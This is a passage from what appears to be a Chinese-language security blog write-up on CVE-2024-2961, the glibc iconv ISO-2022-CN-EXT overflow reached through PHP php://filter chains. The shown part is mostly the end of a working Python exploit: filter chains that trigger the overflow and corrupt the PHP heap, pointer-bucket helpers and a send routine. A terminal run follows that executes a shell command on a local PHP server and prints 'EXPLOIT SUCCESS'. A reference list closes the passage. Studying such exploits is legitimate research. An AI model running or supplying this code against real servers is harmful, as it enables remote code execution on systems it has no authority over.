</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.iconv.L1.L1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Step 3: Trigger overflow
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.iconv.UTF-8.ISO-2022-CN-EXT</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Step 4: Allocate at arbitrary address and change zend_mm_heap
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.quoted-printable-decode</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.iconv.L1.L1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        ]
</span><span style="color:#c0c5ce;">        filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    @</span><span style="color:#bf616a;">inform</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Triggering...</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exploit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">build_exploit_path</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        start = time.</span><span style="color:#8fa1b3;">time</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.remote.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">except</span><span style="color:#c0c5ce;"> (ConnectionError, ChunkedEncodingError):
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">pass
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_print</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">not </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.sleep:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">start + </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.sleep &lt;= time.</span><span style="color:#8fa1b3;">time</span><span style="color:#c0c5ce;">():
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Wrong heap, maybe? If the exploited suggested others, use them!
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_print</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># Remove 2-byte header and 4-byte checksum
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">zlib.</span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(data, </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">b64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes, </span><span style="color:#bf616a;">misalign</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    payload = base64.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(data)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">not misalign and payload.</span><span style="color:#8fa1b3;">endswith</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">&quot;):
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">raise </span><span style="color:#c0c5ce;">ValueError(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Misaligned: </span><span style="color:#c0c5ce;">{data}&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">payload.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(data, </span><span style="color:#d08770;">0x8000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Emulates quoted-printable-encode.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&quot;&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">{x</span><span style="color:#d08770;">:02x</span><span style="color:#c0c5ce;">}&quot; </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">x </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">data).</span><span style="color:#8fa1b3;">upper</span><span style="color:#c0c5ce;">().</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(*</span><span style="color:#bf616a;">ptrs</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">size is not </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(ptrs) * </span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">== size
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">map</span><span style="color:#c0c5ce;">(p64, ptrs))
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">bucket
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">: int = </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the
</span><span style="color:#65737e;">    chunked representation has size `size`.
</span><span style="color:#65737e;">    For instance, `ABCD` with size 10 becomes: `0004</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">ABCD</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">`.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># The caller does not care about the size: let&#39;s just add 8, which is more than
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># enough
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">size is </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        size = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data) + </span><span style="color:#d08770;">8
</span><span style="color:#c0c5ce;">    keep = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data) + </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n\n</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    size = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data)</span><span style="color:#d08770;">:x</span><span style="color:#c0c5ce;">}&quot;.</span><span style="color:#8fa1b3;">rjust</span><span style="color:#c0c5ce;">(size - keep, &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">size.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">() + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; + data + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">dataclass
</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Region</span><span style="color:#eff1f5;">:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    start: int
</span><span style="color:#c0c5ce;">    stop: int
</span><span style="color:#c0c5ce;">    permissions: str
</span><span style="color:#c0c5ce;">    path: str
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    @</span><span style="color:#96b5b4;">property
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">size</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; int:
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.stop - </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.start
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">Exploit</span><span style="color:#c0c5ce;">()
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ayoung:~/iconv$ python exp2.py http://127.0.0.1:8888/index.php &quot;id&gt;/tmp/hack&quot;
</span><span style="color:#c0c5ce;">[*] The data:// wrapper works
</span><span style="color:#c0c5ce;">[*] The php://filter/ wrapper works
</span><span style="color:#c0c5ce;">[*] The zlib extension is enabled
</span><span style="color:#c0c5ce;">[+] Exploit preconditions are satisfied
</span><span style="color:#c0c5ce;">[*] Using 0x7f2a87400040 as heap
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">     EXPLOIT  SUCCESS 
</span></pre>
<h2 id="reference">reference</h2><ul>
<li><a href="https://cloud.tencent.com/developer/article/2429454">原创 Paper | CVE-2024-2961 漏洞分析</a></li>
<li><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">cnext-exploit.py</a></li>
<li><a href="https://lucxer.tech/2024/11/19/39.CVE-2024-2961%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/#poc1">CVE-2024-2961 调试复现分析</a></li>
<li><a href="https://www.freebuf.com/articles/web/403508.html">CVE-2024-2961 漏洞分析</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/iconvdata/iso-2022-cn-ext.c">iso-2022-cn-ext.c</a></li>
<li><a href="https://xz.aliyun.com/news/14127">【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一）</a></li>
</ul>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#basic">basic</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#php-filter">php://filter</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cve-2024-2961">CVE-2024-2961</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#zhuan-huan-wei-iso-2022-cn-ext-shi-chu-xian-yue-jie-xie-ru">转换为 ISO-2022-CN-EXT 时出现越界写入</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#phpdui">php堆</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#php-filterjie-gou">php filter结构</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fen-kuai">分块</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#poc">poc</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="script.js"></script>
</body>
</html>